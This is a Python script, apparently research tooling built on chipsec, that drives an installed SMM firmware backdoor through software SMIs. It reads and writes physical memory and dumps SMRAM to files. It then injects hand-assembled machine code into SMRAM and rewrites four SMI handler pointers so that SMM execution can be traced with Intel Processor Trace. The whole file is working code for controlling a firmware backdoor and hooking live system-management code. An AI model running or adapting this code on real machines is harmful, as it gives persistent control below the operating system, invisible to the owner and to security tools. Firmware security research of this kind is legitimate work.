import struct
import sys, os, shutil
import time
from optparse import OptionParser, make_option


CHIPSEC_TOOL_PATH = '.'

sys.path.append(CHIPSEC_TOOL_PATH)

# SW SMI command value for communicating with backdoor SMM code
BACKDOOR_SW_SMI_VAL = 0xcc

# SW SMI commands for backdoor
BACKDOOR_SW_DATA_PING = 0  # test for allive SMM backdoor
BACKDOOR_SW_DATA_READ_PHYS_MEM = 1  # read physical memory command
BACKDOOR_SW_DATA_READ_VIRT_MEM = 2  # read virtual memory command
BACKDOOR_SW_DATA_WRITE_PHYS_MEM = 3  # write physical memory command
BACKDOOR_SW_DATA_WRITE_VIRT_MEM = 4  # write virtual memory command
BACKDOOR_SW_DATA_TIMER_ENABLE = 5  # enable periodic timer handler
BACKDOOR_SW_DATA_TIMER_DISABLE = 6  # disable periodic timer handler

# See struct _INFECTOR_CONFIG in SmmBackdoor.h
INFECTOR_CONFIG_SECTION = '.conf'
INFECTOR_CONFIG_FMT = 'QI'
INFECTOR_CONFIG_LEN = 8 + 4

# IMAGE_DOS_HEADER.e_res magic constant to mark infected file
INFECTOR_SIGN = 'INFECTED'

# EFI variable with struct _BACKDOOR_INFO physical address
BACKDOOR_INFO_EFI_VAR = 'SmmBackdoorInfo-3a452e85-a7ca-438f-a5cb-ad3a70c5d01b'
BACKDOOR_INFO_FMT = 'QQQQQ'
BACKDOOR_INFO_LEN = 8 * 5

# idicate that SMRAM regions were copied to BACKDOOR_INFO structure
BACKDOOR_INFO_FULL = 0xFFFFFFFF

PAGE_SIZE = 0x1000

cs = None


class Chipsec(object):

    def __init__(self, uefi, mem, ints):
        self.uefi, self.mem, self.ints = uefi, mem, ints


def efi_var_get(name):
    # parse variable name string of name-GUID format
    name = name.split('-')

    return cs.uefi.get_EFI_variable(name[0], '-'.join(name[1:]), None)


efi_var_get_8 = lambda name: struct.unpack('B', efi_var_get(name))[0]
efi_var_get_16 = lambda name: struct.unpack('H', efi_var_get(name))[0]
efi_var_get_32 = lambda name: struct.unpack('I', efi_var_get(name))[0]
efi_var_get_64 = lambda name: struct.unpack('Q', efi_var_get(name))[0]


def mem_read(addr, size):
    return cs.mem.read_physical_mem(addr, size)


def mem_write(addr, size, buff):
    return cs.mem.write_physical_mem(addr, size, buff)


mem_read_8 = lambda addr: struct.unpack('B', mem_read(addr, 1))[0]
mem_read_16 = lambda addr: struct.unpack('H', mem_read(addr, 2))[0]
mem_read_32 = lambda addr: struct.unpack('I', mem_read(addr, 4))[0]
mem_read_64 = lambda addr: struct.unpack('Q', mem_read(addr, 8))[0]


def get_backdoor_info_addr():
    return efi_var_get_64(BACKDOOR_INFO_EFI_VAR)


def get_backdoor_info(addr=None):
    addr = get_backdoor_info_addr() if addr is None else addr

    return struct.unpack(BACKDOOR_INFO_FMT, mem_read(addr, BACKDOOR_INFO_LEN))


def get_backdoor_info_mem(addr=None):
    addr = get_backdoor_info_addr() if addr is None else addr

    return mem_read(addr + PAGE_SIZE, PAGE_SIZE)


def get_smram_info():
    ret = []
    backdoor_info = get_backdoor_info_addr()
    addr, size = backdoor_info + BACKDOOR_INFO_LEN, 8 * 4

    # dump array of EFI_SMRAM_DESCRIPTOR structures
    while True:

        '''
            typedef struct _EFI_SMRAM_DESCRIPTOR 
            {
                EFI_PHYSICAL_ADDRESS PhysicalStart; 
                EFI_PHYSICAL_ADDRESS CpuStart; 
                UINT64 PhysicalSize; 
                UINT64 RegionState;

            } EFI_SMRAM_DESCRIPTOR;
        '''
        physical_start, cpu_start, physical_size, region_state = \
            struct.unpack('Q' * 4, mem_read(addr, size))

        if physical_start == 0:
            # no more items
            break

        ret.append((physical_start, physical_size, region_state))
        addr += size

    return ret


def send_sw_smi(command, data, arg):
    cs.ints.send_SW_SMI(0, command, data, 0, 0, arg, 0, 0, 0)


def dump_mem_page(addr, count=None):
    ret = ''
    backdoor_info = get_backdoor_info_addr()
    count = 1 if count is None else count

    for i in range(count):

        # send read memory page command to SMM code
        page_addr = addr + PAGE_SIZE * i
        send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_READ_PHYS_MEM, page_addr)

        _, _, last_status, _, _ = get_backdoor_info(addr=backdoor_info)
        if last_status != 0:
            raise Exception('SMM backdoor error 0x%.8x' % last_status)

        # copy readed page contents from physical memory
        ret += get_backdoor_info_mem(addr=backdoor_info)

    return ret


def dump_smram():
    try:

        # get SMRAM information
        regions, contents = get_smram_info(), []
        regions_merged = []

        if len(regions) > 1:

            # join neighbour regions
            for i in range(0, len(regions) - 1):

                curr_addr, curr_size, curr_opt = regions[i]
                next_addr, next_size, next_opt = regions[i + 1]

                if curr_addr + curr_size == next_addr:

                    # join two regions
                    regions[i + 1] = (curr_addr, curr_size + next_size, curr_opt)

                else:

                    # copy region information
                    regions_merged.append((curr_addr, curr_size, curr_opt))

            region_addr, region_size, region_opt = regions[-1]
            regions_merged.append((region_addr, region_size, region_opt))

        elif len(regions) > 0:

            regions_merged = regions

        else:

            raise (Exception('No SMRAM regions found'))

        contents = []

        print '[+] Dumping SMRAM regions, this may take a while...'

        # enumerate and dump available SMRAM regions
        for region in regions_merged:
            region_addr, region_size, _ = region

            # dump region contents
            name = 'SMRAM_dump_%.8x_%.8x.bin' % (region_addr, region_addr + region_size - 1)
            data = dump_mem_page(region_addr, region_size / PAGE_SIZE)

            contents.append((name, data))

        # save dumped data to files
        for name, data in contents:
            with open(name, 'wb') as fd:
                print '[+] Creating', name
                fd.write(data)

    except IOError, why:

        print '[!]', str(why)
        return False


def dump_smram2():
    # get backdoor status
    info_addr = get_backdoor_info_addr()
    _, _, last_status, _, _ = get_backdoor_info(addr=info_addr)

    # get SMRAM information
    regions, contents = get_smram_info(), []
    regions_merged = []

    if len(regions) > 1:

        # join neighbour regions
        for i in range(0, len(regions) - 1):

            curr_addr, curr_size, curr_opt = regions[i]
            next_addr, next_size, next_opt = regions[i + 1]

            if curr_addr + curr_size == next_addr:

                # join two regions
                regions[i + 1] = (curr_addr, curr_size + next_size, curr_opt)

            else:

                # copy region information
                regions_merged.append((curr_addr, curr_size, curr_opt))

        region_addr, region_size, region_opt = regions[-1]
        regions_merged.append((region_addr, region_size, region_opt))

    elif len(regions) > 0:

        regions_merged = regions

    else:

        raise (Exception('No SMRAM regions found'))

    print '[+] Dumping SMRAM regions, this may take a while...'

    try:

        ptr = PAGE_SIZE

        # enumerate and dump available SMRAM regions
        for region in regions_merged:

            region_addr, region_size, _ = region
            name = 'SMRAM_dump_%.8x_%.8x.bin' % (region_addr, region_addr + region_size - 1)

            if last_status == BACKDOOR_INFO_FULL:

                # dump region contents from BACKDOOR_INFO structure
                data = mem_read(info_addr + ptr, region_size)
                ptr += region_size

            else:

                # dump region contents with sending SW SMI to SMM backdoor
                data = dump_mem_page(region_addr, region_size / PAGE_SIZE)

            contents.append((name, data))

        # save dumped data to files
        for name, data in contents:
            with open(name, 'wb') as fd:
                print '[+] Creating', name
                fd.write(data)

    except IOError, why:

        print '[!]', str(why)
        return False


def check_system():
    try:

        send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_PING, 0x31337)

        backdoor_info = get_backdoor_info_addr()
        print '[+] struct _BACKDOOR_INFO physical address is', hex(backdoor_info)

        calls_count, ticks_count, last_status, smm_mca_cap, smm_feature_control = \
            get_backdoor_info(addr=backdoor_info)

        print '[+] BackdoorEntry() calls count is %d' % calls_count
        print '[+] PeriodicTimerDispatch2Handler() calls count is %d' % ticks_count
        print '[+] Last status code is 0x%.8x' % last_status
        print '[+] MSR_SMM_MCA_CAP register value is 0x%x' % smm_mca_cap
        print '[+] MSR_SMM_FEATURE_CONTROL register value is 0x%x' % smm_feature_control

        print '[+] SMRAM map:'

        # enumerate available SMRAM regions
        for region in get_smram_info():
            physical_start, physical_size, region_state = region

            print '    address = 0x%.8x, size = 0x%.8x, state = 0x%x' % \
                  (physical_start, physical_size, region_state)

        return True

    except IOError, why:

        print '[!]', str(why)
        return False

def hexdump(data, width = 16, addr = 0):

    ret = ''

    def quoted(data):

        # replace non-alphanumeric characters
        return ''.join(map(lambda b: b if b.isalnum() else '.', data))

    while data:

        line = data[: width]
        data = data[width :]

        # put hex values
        s = map(lambda b: '%.2x' % ord(b), line)
        s += [ '  ' ] * (width - len(line))

        # put ASCII values
        s = '%s | %s' % (' '.join(s), quoted(line))

        if addr is not None:

            # put address
            s = '%.8x: %s' % (addr, s)
            addr += len(line)

        ret += s + '\n'

    return ret


def chipsec_init():
    global cs

    import chipsec.chipset
    import chipsec.hal.uefi
    import chipsec.hal.physmem
    import chipsec.hal.interrupts

    _cs = chipsec.chipset.cs()
    _cs.init(None, True, True)

    cs = Chipsec(chipsec.hal.uefi.UEFI(_cs),
                 chipsec.hal.physmem.Memory(_cs),
                 chipsec.hal.interrupts.Interrupts(_cs))





OriginalSMI_Handler = 0xCB7DDAA4

hook_shell_code_address = 0xcb000000 + 0x4a0000 + 0x500

hook_shell_code_post = '\xB9\x70\x05\x00\x00' \
                       '\x0F\x32' \
                       '\x48\x8B\x44\x24\x10' \
                       '\x0F\x30' \
                       '\xB9\x71\x05\x00\x00' \
                       '\x0F\x32' \
                       '\x48\x8B\x44\x24\x08' \
                       '\x0F\x30' \
                       '\xC3'

hook_shell_code_pre = '\xB9\x71\x05\x00\x00' \
                      '\x0F\x32' \
                       '\x48\x89\x44\x24\x08' \
                       '\x81\xE2\x00\x00\xFF\xFF' \
                       '\x0F\x30' \
                       '\xB9\x70\x05\x00\x00' \
                       '\x0F\x32' \
                       '\x48\x89\x44\x24\x10' \
                       '\x83\xE0\xBF' \
                       '\x83\xC8\x05' \
                       '\x81\xE2\x00\x00\xFF\xFF' \
                       '\x0F\x30' \
                       '\xC3'


hook_shell_code = '\x48\x83\xEC\x18' \
                 '\x48\x89\x4C\x24\x10' \
                 '\xB9\x9E\x00\x00\x00' \
                 '\x0F\x32' \
                 '\xF6\x80\x3C\xFE\x00\x00\x01' \
                 '\x74\x1B' \
                 '\xE8' + struct.pack('<L', 0x16 + 0x11 + len(hook_shell_code_post)) + \
                 '\x48\x8B\x4C\x24\x10' \
                 '\xB8' + struct.pack('<L', OriginalSMI_Handler) + \
                 '\xFF\xD0' \
                 '\xE8' + struct.pack('<L', 0x16) + \
                 '\x48\x83\xC4\x18' \
                 '\xC3' \
                 '\x48\x8B\x4C\x24\x10' \
                 '\xB8' + struct.pack('<L', OriginalSMI_Handler) + \
                 '\xFF\xD0' \
                 '\x48\x83\xC4\x18' \
                 '\xC3' + \
                 hook_shell_code_post + \
                 hook_shell_code_pre


import binascii
#print(binascii.hexlify(hook_shell_code))
#exit()


chipsec_init()
check_system()

backdoor_info = get_backdoor_info_addr()

import subprocess

data = dump_mem_page(hook_shell_code_address, 1)
#print hexdump(data[:0x400], addr=0)

data = hook_shell_code + data[len(hook_shell_code):]
assert len(data) == PAGE_SIZE

mem_write(backdoor_info + PAGE_SIZE, len(data), data)
send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_WRITE_PHYS_MEM, hook_shell_code_address)
_, _, last_status, _, _ = get_backdoor_info(addr=backdoor_info)
if last_status != 0:
    raise Exception('SMM backdoor error 0x%.8x' % last_status)
data = dump_mem_page(hook_shell_code_address, 1)
#print hexdump(data[:0x400], addr=0)


HANDLERS = [
    0xcb7cf000,
    0xcb7cf800,
    0xcb7d0000,
    0xcb7d0800
]

import os

def test_run_PT(smm_module, filename = 'test_trace'):
    PATH_IPT_TOOL = r'ipttool.exe'
    PATH_PTDUMP_TOOL = r'ptdump.exe'
    PATH_PTXED_TOOL = r'ptxed.exe'
    SMMDUMP = r'SMRAM_dump_cb000000_cb7fffff.bin'

    proc1 = subprocess.Popen(PATH_IPT_TOOL + r' --start ' + str(os.getpid()) + r' 12 0', stdout=subprocess.PIPE)
    proc1.wait()

    cs.ints.send_SW_SMI(0, smm_module, 0, 0, 0, 1, 0, 0, 0)

    proc1 = subprocess.Popen(PATH_IPT_TOOL + r' --trace ' + str(os.getpid()) + r' ' + filename, stdout=subprocess.PIPE)
    proc1.wait()

    proc1 = subprocess.Popen(PATH_IPT_TOOL + r' --stop ' + str(os.getpid()), stdout=subprocess.PIPE)
    proc1.wait()

    fw = open(filename + '_pttxt', 'wb')
    proc1 = subprocess.Popen(PATH_PTDUMP_TOOL + r' --no-pad ' + filename, stdout=fw)
    proc1.wait()
    fw.close()

    fw = open(filename + '_ptasm', 'wb')
    proc1 = subprocess.Popen(PATH_PTXED_TOOL + r' --pt ' + filename + ' --raw '+SMMDUMP+':0xcb000000', stdout=fw)
    proc1.wait()
    fw.close()



for w in HANDLERS:
    addr = w
    print('Handler SMM at', hex(addr))
    data = dump_mem_page(addr, 1)

    #assert unpack("<Q", data[0x14e+2:0x14e+2+8])[0] == HANDLER_ADDR

    #print hexdump(data[:0x400], addr=0)
    data = data[:0x14e+2] + struct.pack("<Q", hook_shell_code_address) + data[0x14e+2+8:]
    #print hexdump(data[:0x400], addr=0)

    assert len(data) == PAGE_SIZE
    mem_write(backdoor_info + PAGE_SIZE, len(data), data)
    send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_WRITE_PHYS_MEM, addr)
    _, _, last_status, _, _ = get_backdoor_info(addr=backdoor_info)
    if last_status != 0:
        raise Exception('SMM backdoor error 0x%.8x' % last_status)


test_run_PT(0xcc, 'tracesmm')
